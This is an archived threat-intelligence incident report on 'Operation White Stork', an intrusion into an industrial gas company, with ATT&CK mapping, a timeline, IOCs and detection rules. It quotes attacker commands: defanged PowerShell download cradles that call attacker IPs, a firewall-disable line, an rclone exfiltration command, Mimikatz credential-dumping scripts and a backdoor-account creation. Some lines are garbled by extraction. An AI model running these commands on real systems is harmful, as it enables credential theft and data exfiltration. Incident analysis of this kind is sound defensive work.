{
    "id": "6080955d-4852-48f6-a44f-92050f7872dd",
    "created_at": "2023-01-12T15:04:57.982619Z",
    "updated_at": "2025-03-27T02:09:18.471967Z",
    "deleted_at": null,
    "sha1_hash": "03f0b60dafc5daf7cad3d5b3c1f86f4a6933b86b",
    "title": "2021-05-13 - Catching the White Stork in Flight",
    "authors": "",
    "file_creation_date": "2022-05-28T00:30:49Z",
    "file_modification_date": "2022-05-28T00:30:49Z",
    "file_size": 1775276,
    "plain_text": "# Catching the White Stork in Flight\n\n**awakesecurity.com/blog/catching-the-white-stork-in-flight/**\n\n## Executive Summary\n\n\nMay 13, 2021\n\n\nArista’s Awake Labs team responded to a cybersecurity incident with a campaign that has been active since at least October 2020, which\nwe are labeling Operation White Stork.\nThis campaign utilized multiple techniques and tools including Cobalt Strike Beacon, the MetaSploit Framework, Mimikatz,\n**SharpSploit and exfiltration using rclone.**\nAwake’s analysis showed that the attackers remotely authenticated to the customer’s VPN and externally facing remote desktop gateway\nusing previously compromised credentials, coming in through Tor exit nodes.\nLateral movement was achieved primarily using Windows Remote Desktop (RDP) and PsExec.\n[This investigation demonstrates the importance of monitoring for exfiltration and](https://awakesecurity.com/glossary/data-exfiltration/) [lateral movement as well as hardening external access](https://awakesecurity.com/glossary/lateral-movement/)\npoints for members of staff and contractors, particularly when many people are working remotely.\n\n**Operation White Stork**\n\nIn this post we break down several aspects of this operation, including:\n\nIndustries and Geography\nTactics and Techniques\nInvestigation and Technical Analysis\nIndicators of Compromise (IOCs)\nDetecting the Techniques\n\n### Industries and Geographies\n\nAwake’s analysis of this event shows that the actor appears to have specifically targeted an organization in the industrial gas sector.\n\nThe locations of the attack were isolated to the United States. However, the attackers downloaded an attacker toolset with a Russian name\n(sborka5.zip – ‘sborka’ translates from Russian to ‘assembly’ in English) from the Russian site wdfiles[.]ru and exfiltrated data to a server\nhosted in Lithuania.\n\n### Tactics and Techniques\n\n\n-----\n\ne est gat o de t ed se e a tact cs a d tec ques ac oss t e [&C](https://awakesecurity.com/glossary/mitre-attck-framework/) a e o used by t e t eat acto ese a e deta ed\nbelow.\n\n**ATT&CK Tactic** **Techniques**\n\nInitial Access (TA0001) T1133 – External Remote Services\nT1078 – Valid Accounts\n\nExecution (TA0002) T1059.001 – PowerShell\nT1569.002 – Service Execution\n\nCredential Access (TA0006) T1110 – Brute Force\nT1003.001 – OS Credential Dumping: LSASS Memory\n\nDiscovery (TA0007) T1087.002 – Account Discovery: Domain Account\nT1482 – Domain Trust Discovery\nT1083 – File and Directory Discovery\nT1046 – Network Service Scanning\nT1135 – Network Share Discovery\n\nLateral Movement (TA0008) T1570 – Lateral Tool Transfer\nT1021.001 – Remote Desktop Protocol\nT1021.002 – SMB / Windows Admin Shares\n\nCollection (TA0009) T1560.001 – Archive via Utility\nT1119 – Automated Collection\nT1039 – Data from Network Shared Drive\nT1074.001 – Local Data Staging\nT1074.002 Remote Data Staging\n\nExfiltration (TA0010) T1048 – Exfiltration Over Alternative Protocol\n\n### Incident Timeline and Technical Analysis\n\nThe incident was first detected around 160 days after the initial activity when Mimikatz was detected on an endpoint.\n\nFigure 1: Incident Timeline Summary\n\nIn total, the activity from the threat actor continued for more than 170 days before containment. Figure 1 provides a summary of each major\nstage of the incident, while additional technical details are described below.\n\nThe Awake Labs team’s forensic investigation revealed a timeline that begins with repeated failed attempts to connect to several key endpoints\nwithin the customer environment. These connections, using SMB, occurred from a source IP address within the VPN range. During this time\ntwo Windows Service creation events were observed which indicated malicious PowerShell code had been executed on one of the hosts,\n\n\n-----\n\nject g a **ete p ete pay oad** to e o y\n\nFigure 2 shows the content of the Image Path field for the service named ‘gaZtYZWmtJFOorGy’ while Figure 3 shows the decoded,\ndecompressed code:\n\nFigure 2: Malicious code seen in Windows Service Image Path field\n\nFigure 3: Decoded and decompressed base64 section taken from Figure 2\n\nThis second base64 encoded string was decoded and found to contain additional code containing the following command:\n\n```\npowershell.exe -nop -c IEX ((new-object net.webclient).downloadstring('hxxp[://]45[.]146[.]164[.]193:8712/awq'))\n\n```\n\nThis file was no longer present when the incident response team tried to retrieve it.\n\nAdditional analysis of the code showed thread injection into C:\\Windows\\System32\\ntvdm.exe.\n\nThe code in the Image Path of the second Windows Service event referenced previously was very similar, and had the Service name:\n‘vrzvySWAmvRsgZCh’.\n\nThe attacker then logged into the same system via RDP, using an administrative account, with the source IP again coming from the VPN pool.\nMinutes after this connection, a zip archive named sborka5.zip was downloaded from hxxps[://]wdfiles[.]ru. This archive contained many\ntools, such as those typically used for reconnaissance activity and lateral movement (Mimikatz, AdFind, NetScan, PsExec) as well as exploit\ntools such as those related to Eternal Blue. Interestingly, ‘sborka’ in Russian translates to ‘assembly’ in English. Not all of these tools were\nused by the attackers, but it was noteworthy to see them all hosted together in one place.\n\nFollowing this, the execution of Mimikatz was logged and the file sek.log was created. This file was recovered and found to be a dump of\ncredentials, created using Mimikatz.\n\nShortly after this, a different administrative account was used to log in to the same system via RDP, once again originating from an IP address\nin the VPN range. The attacker then used RDP to move laterally, and once again a zip archive named ‘sborka5.zip’ was downloaded from the\nsame domain as earlier. This was followed by the execution of adfind.bat (see Figure 4) and netscanner64.exe, from within that toolset.\n\n\n-----\n\nFigure 4: Screenshot of the contents of adfind.bat\n\nAs you can see, such information can give the threat actor a lot of information about the domain infrastructure. Each of the output files\nreferenced in Figure 4, other than ad.7z, were found on the system during the incident response process.\n\nThe actor then leveraged an administrative user account to move laterally to a domain controller via RDP and execute adfind.bat and\n**netscan64.exe and then disconnected their session.**\n\nThe threat actor then appeared to lay low for more than a month before leveraging the previous compromised credentials to connect directly to\na domain controller via RDP. Once again the access originated from an IP address within the VPN range. During this session, the file\n**lsass.dmp was created in the user’s AppData\\Local\\Temp\\8\\ directory. Loading this file into WinDBG confirmed it was a dump of the**\n**lsass.exe process:**\n\nFigure 5: WinDBG analysis of the lsass.dmp file indicated this was a dump of the lsass.exe process\n\nThere was then no other evidence of attacker activity for almost two months until logon activity towards several key servers and workstations\nwas observed in the analysed logs. These logons once again originated from IP addresses within the VPN range. The file\n**c:\\programdata\\rundll32.dll was created on several systems. These instances were launched using the rundll32.exe utility with the command**\nline:\n\n```\nC:\\ProgramData\\rundll32.dll vvsection\n\n```\n\nThe attackers then used PsExec to push and execute this DLL on remote systems. This was found to be a Cobalt Strike binary. Analysis\nshowed it attempting to connect to the following URLs:\n\nhxxps[://]newodi[.]com:443/wp-includes/temp.ico\nhxxps[://]newodi[.]com:443/faq.js?restart=false\n\nThis domain resolved to IP address: 23[.]81[.]246[.]123, which, as you will see later, was involved in a clear beaconing pattern.\n\nThe attacker continued using RDP to connect to key servers via the VPN and push and execute the Cobalt Strike DLL on multiple systems.\n\nAt one point the actor launched the Windows Password Recovery tool and procdump.exe from the c:\\perflogs directory. Shortly after this,\nthe Cobalt Strike instance that had been running on one system spawned an instance of cmd.exe and attempted to map a shared drive with\nthe command:\n\n```\nnet use \\\\<ipaddress>\\c$\n\n```\n\nAbout a week later, analysis showed lateral movement via RDP between systems, and the threat actor used an administrative account to\nlaunch another PowerShell script to pull down a second stage payload:\n```\n powershell.exe -nop -w hidden -c \"IEX ((new-object\n net.webclient).downloadstring('hxxp[://]194[.]611[.]53[.]10:80/a213'))\"\n\n```\nFollowing this, the file csharp-streamer.exe was executed from the same user’s \\AppData\\Local\\Temp\\6\\ directory. This was found to be a\n[version of SharpSploit (a post exploitation library written in C#).](https://github.com/cobbr/SharpSploit)\n\nFollowing this activity, another malicious PowerShell command (shown below) was executed using a different administrative user account.\nNote, the IP address in this command was found to be related to Cobalt Strike activity observed elsewhere during the incident.\n\n\n-----\n\n```\n powershell.exe -nop -w hidden -c IEX ((new object net.webclient).downloadstring('hxxp[://]89[.]238[.]185[.]28:4151/a'))\"\n\n```\n**_Investigation Tip:_**\n\nThe above PowerShell commands were pulled from the ConsoleHost_history.txt file from the users’\n**\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine directories – a useful file to pull as part of any investigation. This file is**\nof additional interest if the last modification time of the file lines up with malicious activity. In our case it did, and these were the only\ncommands in the files.\n\nThe file winspool.drv was created in the same user’s AppData\\Roaming\\WinRAR\\Version\\ directory. This file was found to be the remote\naccess tool RMS RAT.\n\nShortly after this, the same user logged into a remote desktop server via an externally facing gateway, accessible via a web interface, and the\nfile Desktop.exe was executed. This file was found to be the remote access tool RMS RAT – the compressed parent of the RMS RAT instance\nreferenced previously.\n\nFollowing this, the file c:\\perflogs\\procdump64.exe was created on the system, and shortly after, **[ADRecon was launched by the same user](https://github.com/adrecon/ADRecon)**\nvia the PowerShell script C:\\PerfLogs\\obfs.ps1. Minutes later, there were two instances of PowerShell commands launching what appeared\nto be Cobalt Strike Beacon, one example is shown in Figure 6:\n\nFigure 6: Obfuscated code found in PowerShell event logs\n\nThe base64 decodes and decompresses to reveal the $DoIt function, which is indicative of Beacon, as shown in Figure 7:\n\nFigure 7: Decompressing and decoding the base64 encoded string in Figure 6\n\nThe remainder of the code contains shellcode that will be reflectively injected into process memory on the system as shown in Figure 8:\n\n\n-----\n\nFigure 8: Encoded shellcode that will be reflectively loaded into process memory\n\nThis was decoded and analysed and found to be reaching out to pull down hxxp[://]89[.]238[.]185[.]28/Rr5c – a file that was no longer live\nwhen the team attempted to retrieve it. The identified user agent was Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\n**LBBROWSER) (which can also be indicative of Metasploit). The process created and injected code into C:\\Windows\\system32\\ntvdm.exe.**\n\nShortly after this, attacker tools such as Advanced_IP_Scanner_2.5.3850.exe and Mimikatz were executed from the c:\\support directory by\nthe same user.\n\nApproximately 30 minutes later, a different account was used to access another remote desktop server from the externally facing gateway and\nlaunch a PowerShell script that had exactly the same functionality as those in Figures 7 and 8. Following this, the same user moved laterally to\na domain controller via RDP and created another lsass.dmp file.\n\nAdditional Windows Service creation events were also observed on one of the domain controllers which were indicative of Cobalt Strike:\n\nFigure 9: Base64 encoded PowerShell command being launched as a service\n\nThe Service name was 9dcbd6f.\n\nDecoding this and analysing the shellcode, the Awake Labs team saw thread injection into C:\\Windows\\system32\\ntvdm.exe. This time,\nrather than attempting to call back to a domain, the following named pipe was created: \\\\.\\pipe\\win_service_ohm5iYaaNoo7po7koaTi\n\n[Thanks to an excellent write up from CrowdStrike, we can see that this activity indicated the jump psexec_psh Cobalt Strike Beacon](https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/)\ncommand had been used to establish an instance of Beacon remotely on this system.\n\n[In addition, the following Windows Service creation events indicated that Cobalt Strike Beacon had been pushed remotely to the same, plus](https://awakesecurity.com/blog/detecting-icedid-and-cobalt-strike-beacon-with-network-detection-and-response/)\none other, domain controller seconds later:\n\n**Service name** **Image path**\n\n2a419f7 \\\\127.0.0.1\\ADMIN$\\2a419f7.exe\n\n891ae60 \\\\127.0.0.1\\ADMIN$\\891ae60.exe\n\n85ac374 \\\\127.0.0.1\\ADMIN$\\85ac374.exe\n\nd27ba3a \\\\127.0.0.1\\ADMIN$\\d27ba3a.exe\n\nef8d577 \\\\127.0.0.1\\ADMIN$\\ef8d577.exe\n\nThese files were not recovered, but thanks to the same CrowdStrike article, we can see that this activity was indicative that the jump psexec\nCobalt Strike Beacon command had been used to establish a Beacon remotely on this system.\n\n\n-----\n\nt e sa e pe od, t e attac e s used to access c t ca de ces a d o e ate a y, o ce aga a t e **S a pSp o t** as u o\nanother system, this time using a critical management account with administrative privileges. On the same day, the user executed\n**C:\\PerfLogs\\x64.exe. When analysed, this was found to launch an instance of sethc.exe (Windows ‘Sticky Keys’ accessibility feature) in a**\nsuspended state, inject code into it, then exit, leaving sethc.exe running as an orphaned process. In addition, we could see that the process\nconnected to datatransferdc[.]com over IPv6\n\n(2606[:]4700[:]3037[:][:]ac43[:]8ca0).\n\nA few days later, the Cobalt Strike Beacon processes (rundll32.dll) running on several systems started beaconing out to\n**23[.]81[.]246[.]123:443, approximately every 31 minutes.**\n\nOn one of these systems, a legitimate version of sethc.exe spawned the process dfrgui.exe (Microsoft Disk Defragmentation process), which\nmade several outbound network connections over the next few days:\n\n**Domain name** **IP address**\n\ntelemetry[.]distrib000[.]com 172[.]67[.]193[.]215\n\nstats[.]0293432094823904832048234[.]work 172[.]67[.]223[.]63\n\nping[.]12093130987381731037123[.]work 104[.]21[.]21[.]133\n\ndash[.]92834298473247204972349234[.]work 172[.]67[.]158[.]54\n\ndns[.]09123312093812039813[.]work 104[.]21[.]79[.]23\n\ntelemetry[.]distrib000[.]com 104[.]21[.]76[.]117\n\nstats[.]0293432094823904832048234[.]work 104[.]21[.]25[.]63\n\nSeveral hours later, the same dfrgui.exe process launched an instance of PowerShell that attempted to pull down another payload from the\nknown malicious IP address shown below:\n```\n C:\\Windows\\system32\\cmd.exe /C powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('\n hxxp[://]89[.]238[.]185[.]28/a'))\"\"\"\n\n```\nThe process made several additional network connections:\n\n**Domain name** **IP address**\n\ndatatransferdc[.]com 104[.]21[.]62[.]240\n\nNot resolved 172[.]67[.]140[.]160\n\nNot resolved 172[.]67[.]198[.]213\n\nNot resolved 172[.]67[.]168[.]181\n\nNot resolved 152[.]199[.]19[.]161\n\nNot resolved 52[.]178[.]182[.]73\n\nNot resolved 51[.]144[.]113[.]175\n\nNot resolved 93[.]184[.]220[.]29\n\nNot resolved 89[.]238[.]185[.]28\n\nThe final connection listed (89[.]238[.]185[.]28) was to port 50050, indicating this IP address is likely running Cobalt Strike Teamserver\nlistening on its default port.\n\nDuring this two day period of activity, the same process made connections to several internal IP addresses over port 3389, indicating further\nattempts to use RDP in an attempt to move laterally. For instance, on one of the systems that was connected to in this manner, the team\nobserved several instances of the following commands:\n\n1. Disable the firewall:\n\n```\nnetsh advfirewall set allprofiles state off\n\n```\n\n2. Download a malicious second stage payload from 89[.]238[.]185[.]28:\n\n\n-----\n\n```\n powershell.exe -nop -w hidden -c IEX ((new-object\n net.webclient).downloadstring('hxxp[://]89[.]238[.]185[.]28/a'))\"\n\n```\nShortly after this, rclone was invoked via Powershell to begin exfiltrating data on a file share to an SFTP server based in Lithuania:\n```\n PowerShell.exe -windowstyle hidden .\\rclone copy --filter-from filter-file.txt <SHARE_LOCATION> conf2:\n <VICTIM_NAME> -q --ignore-existing --auto-confirm --multi-thread-streams 16 --transfers 16 -max-age 2y\n\n```\nThe contents of the rclone configuration file are shown in Figure 10 below:\n\nFigure 10: Rclone SFTP server configuration information\n\nThe contents of filter-file.txt are shown in Figure 11 below:\n\nFigure 11: Filter file used to tell rclone which files to upload\n\nA review of the firewall logs showed several gigabytes of data uploaded to the IP address 91[.]103[.]255[.]177 at this time.\n\nThe dfrgui.exe process continued to make internal network connections over port 3389, as well as outbound connections to 80[.]153[.]159[.]29\nover port 3390, and 45[.]130[.]138[.]81 towards port 50050 indicating this was also likely related to Cobalt Strike.\n\nAt this point the Awake Labs team began taking actions to contain the incident and shut off the exfiltration while in process.\n\nAfter the containment started, the firewall logs showed there were several attempts made to authenticate to the VPN from multiple users;\nwhich eventually proved successful. These connections all came from the same source: Tor exit node IP address 185[.]220[.]100[.]252\n(AS205100 F3 Netze e.V. out of Germany.)\n\nDuring this session, the actor successfully logged on to another server and created several files associated with Mimikatz and Tor, such as\n**c:\\users\\<user>\\downloads\\mimidrv.zip and c:\\users\\<user>\\desktop\\tor.zip.**\n\nShortly after this, the firewall logs showed the same user authenticated to the VPN from a known Tor exit node: 91[.]218[.]203[.]59. During this\nVPN session, several systems were logged into via RDP.\n\nDuring these sessions, the user installed and ran Tor by creating and launching:\n\n```\nC:\\Windows\\System32\\cmd.exe /C C:\\Windows\\System32\\AppLocker\\start.bat\n\n```\n\nWhich in turn launched:\n\n```\nC:\\Windows\\System32\\AppLocker\\AppLocker.exe --service install -options -f C:\\Windows\\System32\\AppLocker\\torrc\n\n```\n\nAnother lsass.dmp file was created in another compromised administrator account’s \\appdata\\local\\temp\\ directory. The file 12212.7z was\ncreated at the same time on the same user’s Desktop; neither file was recovered.\n\nContainment and remediation measures were then put fully into place with ongoing monitoring. Since the containment was enacted, we are yet\nto see evidence of the threat actor’s return.\n\n### Conclusions and Recommendations\n\nIn this instance a threat actor was able to access the network through the VPN, move laterally via Windows Remote Desktop protocol and\nPsExec, download a toolset from a Russian file sharing site – which contained a vast array of attacker tools – install some backdoors, and from\nthere were able to reach their target and begin to exfiltrate data.\n\n\n-----\n\nCo pa y sta a e o g e ote y o o e t a e e s a esu t, e te a access po ts a e e ed upo o e a d o e o sta to ca y\nout their work duties in the same efficient manner as if they were in the office. Awake Labs sees breaches where initial access is achieved\nthrough external access points (such as VPN or Remote Desktop Gateway) frequently. It is vital that measures are put in place to harden\nremote endpoints and exposed external infrastructure. Awake recommends the following items are enforced at a minimum:\n\nMulti-Factor Authentication (MFA) for external access to any company resources (VPN, internal services, etc.).\nA strong password policy, whereby passwords should meet a required minimum length; should contain a combination of upper and lower\ncase letters, numbers and special characters; and should be changed regularly.\nRegular user education on security and the risks of poor hygiene.\nRemain up to date on vulnerability patching and mitigation for externally facing services.\nAsset tracking and management of remote devices. Ensure any devices being used for work purposes are identifiable and have\ncompany standard security tools installed, are actively monitored and up to date (anti-virus, EDR, etc.).\n\nOnce an external user has authenticated to a VPN, it is important to make sure they can only access systems they need to access for\nbusiness purposes. It is also important to only allow access between network segments that is required for business purposes. Ultimately,\n[implementing a Zero Trust model is recommended.](https://awakesecurity.com/white-papers/wp-building-your-zero-trust-strategy-with-nist-800-207-and-ndr/)\n\n### Host based IOCs\n\nContents of sborka5.zip archive file (note some of these are not IOCs per se, but have been kept in for completeness):\n\n**File path** **sha256 hash** **Contents**\n\nebbs.exe 7f5f447fe870449a8245e7abc19b9f4071095e02813d5f42c622add56da15b8b\n\netw576sz.exe e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173\n\nPsExec.exe 3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef\n\nScanner.exe a140e9a3ec3f600ef34e221997f93d70bde20b7dabcc72cf0d120e535a9638f7\n\nAdFind/adcsv.pl cb2c9da00ca544cfe3dddfa491cb97a7d6da8e3b00e17c00a78c13c47c0db8b6\n\nAdFind/adfind.bat 014db7075dc15953ade603627b5f990c79ae35c098129a99876705dc3dc20dd3 See Figure 3\n\nAdFind/AdFind.exe c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3\n\n\nCVE-2019-1388-master/CVE2019-1388-master/CVE-20191388.gif\n\nCVE-2019-1388-master/CVE2019-1388-master/HHUPD.EXE\n\n\n320af511385a1479ef2ef5e2fbc55ef58f83c1627c33c0d6a029fb54848fd30f\n\n0745633619afd654735ea99f32721e3865d8132917f30e292e3f9273977dc021\n\n\neternal/eternalblue.exe e2cc26b8b38fab6799bd834b8284c1b921339f0133a606d1178c39a720d871c3\n\neternal/commands.txt d60097e359ac0c98034cc2875c00f5d4f32d2c46ec8d420d82dadd8473cb3eb3 _cmd /c net user petr_\n_2k3X8X57 /add_\n\n_cmd /c net localgroup_\n_administrators petr /add_\n\nlpe/runsysO.cr 6516bbd99089964e121bab9d448cce19a991aeaf4cbfca4fa1bc7a2357d1948c\n\nmimikatz_trunk/kiwi_passwords.yar 966a58176b30c9bd5d4abfee0690e454129296e5522bbcf5f3c9db7fc84e279e\n\nmimikatz_trunk/lsadump.bat 750aa70ef96cdae1d3a7be92a022b1b3522bdf5a1ff777bf9f7c9af39c53cc21 _mimikatz #_\n_privilege::debug_\n\n_mimikatz # inject::process_\n_lsass.exe sekurlsa.dll_\n\n_mimikatz #_\n_@getLogonPasswords_\n\nmimikatz_trunk/mimicom.idl 51d45e6c5df6b43b17afc863794f34000d32fb37cd7c3664efc5bd99039ac3df\n\nmimikatz_trunk/README.md 56e362b25b365ab16793f15c29f5f05ac6a38a4bfc3d2b38b3a1fcc060b12deb\n\n\n-----\n\nmimikatz_trunk/sekurlsa.bat 80a025a8548b8272ab91b9aabdc1a742dfe0e7cb123f1fb3f0e897f054257348 _@echo off_\n\n_mimikatz privilege::debug_\n_sekurlsa::logonPasswords_\n_exit > c.txt_\n\nnetscan_portable/netscan32.exe 572d88c419c6ae75aeb784ceab327d040cb589903d6285bbffa77338111af14b\n\nnetscan_portable/netscan64.exe bb574434925e26514b0daf56b45163e4c32b5fc52a1484854b315f40fd8ff8d2\n\n**Other host based IOCs:**\n\n\n**Indicator** **Indicator**\n**type**\n\ngaZtYZWmtJFOorGy Service\nname\n\nvrzvySWAmvRsgZCh Service\nname\n\n%comspec% Service\nimage\npath\n\n\n**Description**\n\nService name for injecting meterpreter\nshellcode – note this is changeable but\nprovided for reference\n\nService name for injecting meterpreter\nshellcode – note this is changeable but\nprovided for reference\n\nIndication that a service is launching a\ncommand prompt. Seeing a service Image\nPath start with this is suspicious\n\n\nsborka5.zip Filename Archive containing attacker tools and files\n\nsek.log Filename Mimikatz output\n\nad_users.txt Filename Output from adfind.exe\n\nad_computers.txt Filename Output from adfind.exe\n\nad_ous.txt Filename Output from adfind.exe\n\nad_subnets.txt Filename Output from adfind.exe\n\nad_group.txt Filename Output from adfind.exe\n\nad_trustdmp.txt Filename Output from adfind.exe\n\nad.7z Filename Archive containing adfind output files\n\nlsass.dmp Filename Dump of lsass.exe process\n\nAppData\\Local\\Temp\\<num>\\ File path Staging directory\n\nc:\\programdata\\rundll32.dll File path Cobalt Strike\n\n\n82900aea8a8617f0d49e1c036d1bc23cc768e71b746a0ee5d2bf5cbf43841768 Sha256\nhash\n\nrundll32.exe C:\\ProgramData\\rundll32.dll vvsection Command\nline\nargument\n\n\nCobalt Strike (rundll32.dll)\n\nCommand line argument to launch Cobalt\nStrike DLL\n\n\nC:\\perflogs\\ File path Staging directory used by attackers\n\nprocdump.exe Filename Tool for dumping process memory\n\nWPR.exe Filename Windows Password Recovery tool\n\n\nnet use \\\\<ipaddress>\\c$ Command\nline\nargument\n\n\nCommand used by attacker to map shared\ndrives\n\n\ncsharp-streamer.exe Filename Version of SharpSploit post exploitation tool kit\n\n\nad5c06b52b468711f4f1ce1bf6957506b805b07e52c9be331035536672505160 Sha256\nhash\n\ncd43f4c2f4590e1993991b5f7c890919cd0bb6b378c222c21a7ce956759c8a94 Sha256\nhash\n\n\nVersion of SharpSploit post exploitation tool kit\n\nRMS RAT\n\n\n-----\n\n6184e4c8915a3924a9a12e26c42cffef35a1d1380a8c0a236ef65df71b20c217 Sha256\nhash\n\n\nRMS RAT\n\n\nC:\\PerfLogs\\obfs.ps1 File path PowerShell script used to launch ADRecon\n\nC:\\support\\ File path Staging directory\n\n\nService name with 7, apparently random alphanumeric characters Service\nname\n\n\\\\127.0.0.1\\ADMIN$\\<7 alphanumeric chars>.exe Service\nImage\nPath\n\n\nIndicative of Cobalt Strike, example: 2a419f7\n\nIndicative of Cobalt Strike, example:\n\n\\\\127.0.0.1\\ADMIN$\\2a419f7.exe\n\n\nC:\\PerfLogs\\x64.exe File path Cobalt Strike\n\n\n53031ae7cdd8627c57f341934290e96b757b38beab29ce847fc09140e29349ab Sha256\nhash\n\n\nCobalt Strike\n\n\nrclone.exe Filename Used to exfiltrate data\n\n\nfc03b8c51889be55b73a02efe02f59eb2836e63f5f032aa00dd611ff07e76d0c sha256\nhash\n\n\nSha256 hash of rclone.exe\n\n\nfilter-file.txt Filename Filter file used by rclone\n\nmimidrv.zip Filename Mimikatz\n\nC:\\Windows\\System32\\AppLocker\\start.bat File path Batch script used to start Tor\n\nC:\\Windows\\System32\\AppLocker\\torrc File path Tor configuration file\n\n12212.7z Filename Archive file – unrecovered\n\nadvanced_IP_Scanner_2.5.3850.exe Filename Reconnaissance tool\n\nloader.exe Filename Component of Windows Password Recovery\nservice\n\nloader64.exe Filename Component of Windows Password Recovery\nservice\n\n**Network IOCs**\n\n\n**Indicator** **Indicator**\n**type**\n\n\n**Description**\n\n\nhxxps[://]wdfiles[.]ru Domain Staged attacker tools\n\nhxxps[://]newodi[.]com Domain Cobalt Strike\n\nhxxps[://]newodi[.]com:443/wp-includes/temp.ico URL Cobalt Strike\n\nhxxps[://]newodi[.]com:443/faq.js?restart=false URL Cobalt Strike\n\n23[.]81[.]246[.]123 IPv4 Cobalt Strike\n\nhxxp[://]194[.]61[.]53[.]10:80/a213 URL Second stage payload\n\n194[.]61[.]53[.]10 IPv4 IP address hosting second stage payload\n\n89[.]238[.]185[.]28 IPv4 IP address associated with second stage payload\n\nhxxp[://]89[.]238[.]185[.]28/a URL Second stage payload\n\nhxxp[://]89[.]238[.]185[.]28:4151/a URL Second stage payload\n\nhxxp[://]89[.]238[.]185[.]28/Rr5c URL Second stage payload\n\n\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;\nTrident/5.0; LBBROWSER)\n\n\nUser\nagent\n\n\nIndicative of Metasploit\n\n\n45[.]146[.]164[.]193 IPv4 IP reached out to by Meterpreter to pull down second stage payload and\ninject it into memory\n\nhxxp[://]45[.]146[.]164[.]193:8712/awq URL Second stage payload\n\n\n-----\n\n\\\\.\\pipe\\win_service_ohm5iYaaNoo7po7koaTi Named\npipe\n\n\nCobalt Strike\n\n\ntelemetry[.]distrib000[.]com Domain Connected to by malicious instance of dfrgui.exe\n\nstats[.]0293432094823904832048234[.]work Domain Connected to by malicious instance of dfrgui.exe\n\nping[.]12093130987381731037123[.]work Domain Connected to by malicious instance of dfrgui.exe\n\ndash[.]92834298473247204972349234[.]work Domain Connected to by malicious instance of dfrgui.exe\n\ndns[.]09123312093812039813[.]work Domain Connected to by malicious instance of dfrgui.exe\n\ndatatransferdc[.]com Domain Connected to by malicious instance of dfrgui.exe\n\n2606[:]4700[:]3037[:][:]ac43[:]8ca0 IPv6 IPv6 address used by malware to connect to datatransferdc[.]com\n\n172[.]67[.]193[.]215 IPv4 Connected to by malicious instance of dfrgui.exe\n\n172[.]67[.]223[.]63 IPv4 Connected to by malicious instance of dfrgui.exe\n\n104[.]21[.]21[.]133 IPv4 Connected to by malicious instance of dfrgui.exe\n\n172[.]67[.]158[.]54 IPv4 Connected to by malicious instance of dfrgui.exe\n\n104[.]21[.]79[.]23 IPv4 Connected to by malicious instance of dfrgui.exe\n\n104[.]21[.]76[.]117 IPv4 Connected to by malicious instance of dfrgui.exe\n\n104[.]21[.]62[.]240 IPv4 Connected to by malicious instance of dfrgui.exe\n\n172[.]67[.]140[.]160 IPv4 Connected to by malicious instance of dfrgui.exe\n\n172[.]67[.]198[.]213 IPv4 Connected to by malicious instance of dfrgui.exe\n\n172[.]67[.]168[.]181 IPv4 Connected to by malicious instance of dfrgui.exe\n\n52[.]178[.]182[.]73 IPv4 Connected to by malicious instance of dfrgui.exe\n\n51[.]144[.]113[.]175 IPv4 Connected to by malicious instance of dfrgui.exe\n\n50050 Port Default Cobalt Strike TeamServer port\n\n91[.]103[.]255[.]177 IPv4 SFTP server used for exfiltration\n\n80[.]153[.]159[.]29 IPv4 Connected to by malicious instance of dfrgui.exe (resolves to\np50999f1d[.]dip0[.]t-ipconnect[.]de)\n\n45[.]130[.]138[.]81 IPv4 Connected to by malicious instance of dfrgui.exe – connection made\nusing default Cobalt Strike TeamServer port\n\n**Detecting the Techniques**\n\n**Platform** **Detection**\n\nCarbon Black Cloud The application rclone.exe was detected running\nA known virus (Trojan: RMS) was detected\nA known virus (PUP: GenericKD) was detected running.\nA known virus (Trojan: MS17) was detected.\nA known virus (PWS: Mimikatz) was detected.\nA known virus (Trojan: Meterpreter) was detected.\nWatchlist query: ((process_cmdline:rundll32.dll) OR (process_cmdline:comspec))\n\nAwake Security Platform Lateral Movement: PsExec Like Activity\nLateral Movement and Execution: Remote Command Execution (psexec, cobalt strike, metasploit, others)\nExfiltration: External FTP Upload\nCompliance: SSH Upload Direct To IP\n\n**By Kieran Evans and Jason Bevis**\n\n### Subscribe!\n\nIf you liked what you just read, subscribe to hear about our threat research and security analysis.\n\n\n-----\n\nKieran Evans\n\nThreat Hunting and Incident Response Specialist\n\n[LinkedIn](https://www.linkedin.com/in/kieran-evans-77632427/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-13 - Catching the White Stork in Flight.pdf"
    ],
    "report_names": [
        "2021-05-13 - Catching the White Stork in Flight.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535897,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653697849,
    "ts_modification_date": 1653697849,
    "files": {
        "pdf": "https://archive.orkl.eu/03f0b60dafc5daf7cad3d5b3c1f86f4a6933b86b.pdf",
        "text": "https://archive.orkl.eu/03f0b60dafc5daf7cad3d5b3c1f86f4a6933b86b.txt",
        "img": "https://archive.orkl.eu/03f0b60dafc5daf7cad3d5b3c1f86f4a6933b86b.jpg"
    }
}